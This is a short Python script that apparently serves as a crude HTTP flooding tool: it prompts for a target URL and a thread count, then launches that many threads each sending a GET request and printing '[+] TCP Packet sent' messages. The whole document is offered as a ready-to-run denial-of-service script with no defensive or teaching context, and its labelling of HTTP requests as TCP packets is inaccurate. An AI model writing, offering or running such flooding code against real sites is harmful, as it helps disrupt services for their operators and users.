import threading
import requests

url = input("URL: ")
threads = int(input("Threads: "))

headers = {'max-bandswitch': '2'}
response = requests.get(url, headers=headers)


def request():
    try:
        requests.get(url, headers=headers)
        print("\033[32m[+]\033[0m TCP Packet sent ->", url)

    except Exception as err:
        print("\033[31m[-]\033[0m", err)


if response.status_code == 200:
    for i in range(threads):
        t = threading.Thread(target=request)
        t.start()

input("")
